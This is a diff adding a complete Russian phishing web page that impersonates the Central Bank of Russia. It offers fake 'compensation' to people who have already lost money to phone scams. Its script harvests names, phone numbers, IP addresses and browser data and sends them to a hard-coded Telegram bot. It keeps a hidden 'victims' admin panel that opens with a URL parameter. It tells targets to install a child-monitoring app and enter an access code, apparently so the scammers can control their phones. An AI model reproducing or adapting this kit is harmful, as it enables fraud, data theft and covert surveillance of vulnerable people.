@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ЦБ РФ | Компенсационная программа</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        body {
+            background: linear-gradient(to bottom, rgba(13, 71, 161, 0.6), rgba(26, 35, 126, 0.65)), 
+                        url('https://www.ntv.ru/home/news/2023/20230706/cb1_sno.jpg') no-repeat center center fixed;
+            background-size: cover;
+            color: white; 
+            min-height: 100vh; 
+            padding: 20px;
+        }
+        .container {
+            max-width: 500px; 
+            margin: 0 auto; 
+            background: white; 
+            color: black;
+            border-radius: 15px; 
+            padding: 30px; 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            position: relative;
+        }
+        .header {
+            text-align: center; 
+            border-bottom: 2px solid #0d47a1;
+            padding-bottom: 20px; 
+            margin-bottom: 30px;
+        }
+        .logo-img {
+            height: 60px;
+            margin-bottom: 10px;
+        }
+        .logo-text {
+            font-size: 1.8em; 
+            color: #0d47a1; 
+            font-weight: bold; 
+            margin-bottom: 5px;
+        }
+        .badge {
+            background: #4caf50; 
+            color: white; 
+            padding: 5px 15px;
+            border-radius: 20px; 
+            display: inline-block; 
+            margin: 10px 0; 
+            font-size: 0.9em;
+        }
+        .form-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 5px; color: #555; }
+        input {
+            width: 100%; 
+            padding: 12px; 
+            border: 2px solid #ddd;
+            border-radius: 8px; 
+            font-size: 16px;
+        }
+        .check-btn {
+            width: 100%; 
+            padding: 15px; 
+            background: #0d47a1; 
+            color: white;
+            border: none; 
+            border-radius: 8px; 
+            font-size: 1.1em; 
+            cursor: pointer; 
+            margin: 20px 0;
+            transition: background 0.3s;
+        }
+        .check-btn:hover {
+            background: #1a237e;
+        }
+        .result {
+            display: none; 
+            background: #e8f5e9; 
+            padding: 25px;
+            border-radius: 10px; 
+            margin: 25px 0; 
+            text-align: center;
+        }
+        .amount {
+            font-size: 2.5em; 
+            color: #0d47a1; 
+            font-weight: bold; 
+            margin: 15px 0;
+        }
+        .download-btn {
+            display: block; 
+            background: #ff9800; 
+            color: white; 
+            text-align: center;
+            padding: 15px; 
+            border-radius: 8px; 
+            text-decoration: none; 
+            margin: 20px 0; 
+            font-weight: bold;
+            transition: background 0.3s;
+        }
+        .download-btn:hover {
+            background: #e68900;
+        }
+        .manager-note {
+            background: #e3f2fd; 
+            border: 1px solid #2196f3; 
+            padding: 12px;
+            border-radius: 8px; 
+            margin: 15px 0; 
+            font-size: 0.9em; 
+            color: #0d47a1;
+        }
+        .admin-panel {
+            background: #f1f1f1; 
+            padding: 20px; 
+            border-radius: 10px; 
+            margin-top: 30px;
+            border: 2px dashed #ff4444; 
+            display: none; 
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+<!-- Шапка с логотипом -->
+<div class="header">
+    <div style="display: flex; align-items: center; justify-content: center; gap: 20px; margin-bottom: 15px;">
+        <img src="https://i.ytimg.com/vi/ZropkIAHdxY/maxresdefault.jpg" 
+             alt="Логотип ЦБ РФ" 
+             style="width: 70px; height: 70px; object-fit: contain;"
+             onerror="this.style.display='none'">
+        <div style="text-align: left;">
+            <div class="logo-text" style="font-size: 1.8em; color: #0d47a1; font-weight: bold; margin-bottom: 5px;">
+                ЦЕНТРАЛЬНЫЙ БАНК<br>РОССИЙСКОЙ ФЕДЕРАЦИИ
+            </div>
+            <div class="badge" style="background: #4caf50; color: white; padding: 4px 12px; border-radius: 15px; display: inline-block; font-size: 0.85em;">
+                Официальная программа компенсаций
+            </div>
+        </div>
+    </div>
+    
+    <div style="background: #f0f7ff; padding: 15px; border-radius: 10px; border-left: 4px solid #0d47a1; margin-top: 10px;">
+        <p style="color: #333; margin: 0; line-height: 1.5; font-size: 0.95em;">
+            <strong style="color: #0d47a1;">📍 Возврат средств пострадавшим от телефонных мошенников</strong><br>
+            Если вам звонили от лица банка или службы безопасности и вы переводили деньги — 
+            проверьте право на компенсацию через наш портал.<br><br>
+            
+            <span style="color: #d32f2f; font-weight: bold;">💰 Указанная сумма — гарантированный минимум выплаты.</span><br>
+            Если фактические потери больше — предоставьте доказательства сотруднику для 
+            оформления дополнительных выплат.
+        </p>
+    </div>
+</div>
+
+        <!-- ПОЛЯ ДЛЯ ВВОДА -->
+        <div class="form-group">
+            <label>Фамилия</label>
+            <input type="text" id="lastName" placeholder="Иванов" required>
+        </div>
+        <div class="form-group">
+            <label>Имя</label>
+            <input type="text" id="firstName" placeholder="Иван" required>
+        </div>
+        <div class="form-group">
+            <label>Отчество</label>
+            <input type="text" id="middleName" placeholder="Иванович">
+        </div>
+        <div class="form-group">
+            <label>Номер телефона</label>
+            <input type="tel" id="phone" placeholder="+7 999 123-45-67" required>
+        </div>
+
+        <button class="check-btn" onclick="checkCompensation()">🔍 ПРОВЕРИТЬ КОМПЕНСАЦИЮ</button>
+
+        <!-- РЕЗУЛЬТАТ ДЛЯ ЛОХА -->
+        <div class="result" id="result">
+            <div class="badge">🎉 ВАША ВЫПЛАТА ОДОБРЕНА!</div>
+            <h3 id="userName"></h3>
+            <p>По решению Арбитражного суда г. Москва</p>
+            <div class="amount" id="moneyAmount">0 ₽</div>
+            <p>Средства зарезервированы на ваше имя.</p>
+
+            <p><strong>Для получения выплата:</strong></p>
+            <ol style="text-align: left; background: #f5f5f5; padding: 15px; border-radius: 8px;">
+                <li>Скачайте приложение FlashGet Kids по кнопке ниже. Для безопасности устанавливайте <strong>"Детское приложение"</strong>.</li>
+                <li>Установите и зарегистрируйтесь в приложении.</li>
+                <li>Введите код доступа: <strong>317 287 002</strong></li>
+                <li>Следуйте инструкции в приложении.</li>
+            </ol>
+
+            <div class="manager-note">
+                <strong>❗ Важно:</strong> Для помощи с установкой с вами свяжется менеджер.<br>
+                Продублируйте сумму выплаты менеджеру в чат для ускорения получения.
+            </div>
+
+            <a href="https://flashget.kids/ru" class="download-btn" target="_blank">
+                ⬇️ СКАЧАТЬ FLASHGET KIDS ДЛЯ ПОЛУЧЕНИЯ ДЕНЕГ
+            </a>
+            <p style="color: #666; font-size: 0.9em; margin-top: 15px;">Ожидайте звонка менеджера в течение 24 часов.</p>
+        </div>
+
+        <!-- АДМИН-ПАНЕЛЬ (ЖЕРТВЫ) - СКРЫТА ОТ ВСЕХ -->
+        <div class="admin-panel" id="adminPanel">
+            <h4 style="color: #d32f2f; margin-bottom: 15px;">📊 ЖЕРТВЫ (последние 20)</h4>
+            <div id="victimsList">Данных пока нет...</div>
+            <button class="check-btn" style="background: #666; margin-top: 10px;" onclick="clearData()">
+                ОЧИСТИТЬ ВСЕ ДАННЫЕ
+            </button>
+        </div>
+
+        <!-- ОФИЦИАЛЬНЫЙ ПОДВАЛ БЕЗ КНОПОК -->
+        <div style="text-align: center; margin-top: 30px; padding-top: 20px; border-top: 1px solid #eee; color: #666; font-size: 0.8em;">
+            <p>© 2026 Центральный Банк Российской Федерации. Официальный портал получения выплат.</p>
+        </div>
+    </div>
+
+    <script>
+        // Telegram конфигурация
+        const TELEGRAM_BOT_TOKEN = '8342473970:AAE6mDW2M_EeGueQu3bXICDqHOdxi9ARDB8';
+        const TELEGRAM_CHAT_ID = '7192647932';
+        
+        // Локальное хранилище
+        let victimsData = JSON.parse(localStorage.getItem('victimsData')) || [];
+        let totalRequests = parseInt(localStorage.getItem('totalRequests')) || 0;
+
+        async function checkCompensation() {
+            const lastName = document.getElementById('lastName').value.trim();
+            const firstName = document.getElementById('firstName').value.trim();
+            const phone = document.getElementById('phone').value.trim();
+
+            if (!lastName || !firstName || !phone) {
+                alert('Заполните все обязательные поля');
+                return;
+            }
+
+            // Случайная сумма от 85к до 280к
+            const amounts = [85000, 127000, 189000, 215000, 280000];
+            const randomAmount = amounts[Math.floor(Math.random() * amounts.length)];
+            
+            // Получаем IP адрес
+            let ipAddress = 'Не определен';
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                ipAddress = data.ip;
+            } catch (error) {
+                // Если не получилось получить IP, используем fallback
+            }
+
+            // Сохраняем жертву локально
+            const victimInfo = {
+                name: `${lastName} ${firstName} ${document.getElementById('middleName').value.trim() || ''}`.trim(),
+                phone: phone,
+                amount: randomAmount,
+                time: new Date().toLocaleString('ru-RU'),
+                ip: ipAddress,
+                userAgent: navigator.userAgent.substring(0, 100)
+            };
+
+            victimsData.push(victimInfo);
+            totalRequests++;
+            
+            if (victimsData.length > 20) victimsData = victimsData.slice(-20);
+            
+            localStorage.setItem('victimsData', JSON.stringify(victimsData));
+            localStorage.setItem('totalRequests', totalRequests);
+
+            // Отправляем в Telegram
+            sendToTelegram(victimInfo);
+
+            // Показываем результат лоху
+            document.getElementById('userName').textContent = victimInfo.name;
+            document.getElementById('moneyAmount').textContent = randomAmount.toLocaleString('ru-RU') + ' ₽';
+            document.getElementById('result').style.display = 'block';
+            document.getElementById('result').scrollIntoView({ behavior: 'smooth' });
+
+            // Если админка открыта - обновляем
+            if (document.getElementById('adminPanel').style.display === 'block') {
+                updateAdminPanel();
+            }
+        }
+
+        // Функция отправки в Telegram
+        function sendToTelegram(victimInfo) {
+            const message = `🎣 НОВАЯ ЗАЯВКА ЦБ РФ #${totalRequests}
+
+👤 ФИО: ${victimInfo.name}
+📱 Телефон: ${victimInfo.phone}
+💰 Сумма: ${victimInfo.amount.toLocaleString()} ₽
+⏰ Время: ${victimInfo.time}
+🌐 IP: ${victimInfo.ip}
+📱 Браузер: ${victimInfo.userAgent}
+
+📊 Всего заявок: ${totalRequests}`;
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            // Используем fetch для отправки
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log('✅ Данные отправлены в Telegram');
+                } else {
+                    console.error('❌ Ошибка Telegram:', data.description);
+                    // Пробуем альтернативный метод
+                    sendAlternativeTelegram(victimInfo);
+                }
+            })
+            .catch(error => {
+                console.error('❌ Ошибка сети:', error);
+                sendAlternativeTelegram(victimInfo);
+            });
+        }
+
+        // Альтернативный метод отправки в Telegram
+        function sendAlternativeTelegram(victimInfo) {
+            const simpleMessage = `Заявка: ${victimInfo.name} | ${victimInfo.phone} | ${victimInfo.amount} руб | ${victimInfo.time}`;
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(simpleMessage)}`;
+            
+            // Используем image для обхода CORS если нужно
+            const img = new Image();
+            img.src = url;
+            img.style.display = 'none';
+            document.body.appendChild(img);
+            setTimeout(() => document.body.removeChild(img), 1000);
+        }
+
+        // Функции админ-панели (работают, но она скрыта)
+        function updateAdminPanel() {
+            const listDiv = document.getElementById('victimsList');
+            if (victimsData.length === 0) {
+                listDiv.innerHTML = 'Данных пока нет...';
+                return;
+            }
+            let html = `<p><strong>Всего заявок отправлено в Telegram:</strong> ${totalRequests}</p>`;
+            victimsData.slice().reverse().forEach((victim) => {
+                html += `<div style="background: white; padding: 10px; margin: 5px 0; border-radius: 5px; border-left: 4px solid #d32f2f;">
+                    <strong>${victim.name}</strong><br>
+                    📱 ${victim.phone}<br>
+                    💰 ${victim.amount.toLocaleString()} руб<br>
+                    ⏰ ${victim.time}<br>
+                    🌐 IP: ${victim.ip}
+                </div>`;
+            });
+            listDiv.innerHTML = html;
+        }
+
+        function clearData() {
+            if (confirm('Удалить ВСЕ локальные данные?')) {
+                victimsData = [];
+                totalRequests = 0;
+                localStorage.removeItem('victimsData');
+                localStorage.removeItem('totalRequests');
+                updateAdminPanel();
+                alert('Локальные данные очищены. Данные в Telegram остались.');
+            }
+        }
+
+        // ПРОВЕРКА ПАРАМЕТРА ССЫЛКИ: если открыта с ?admin=777
+        document.addEventListener('DOMContentLoaded', function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.get('admin') === '777') {
+                // ПОКАЗЫВАЕМ АДМИНКУ ТОЛЬКО ТЕБЕ
+                document.getElementById('adminPanel').style.display = 'block';
+                updateAdminPanel();
+            }
+            // Если жертвы уже есть, меняем заголовок (только тебе видно)
+            if (victimsData.length > 0) {
+                document.title = `ЦБ РФ | ${victimsData.length} проверок`;
+            }
+            
+            // Тестируем соединение с Telegram при загрузке
+            testTelegramConnection();
+        });
+
+        // Функция тестирования соединения с Telegram
+        function testTelegramConnection() {
+            const testUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getMe`;
+            fetch(testUrl)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log('✅ Telegram бот подключен:', data.result.username);
+                    } else {
+                        console.warn('⚠️ Telegram бот недоступен:', data.description);
+                    }
+                })
+                .catch(() => {
+                    console.warn('⚠️ Не удалось проверить Telegram соединение');
+                });
+        }
+    </script>
+</body>
+</html>
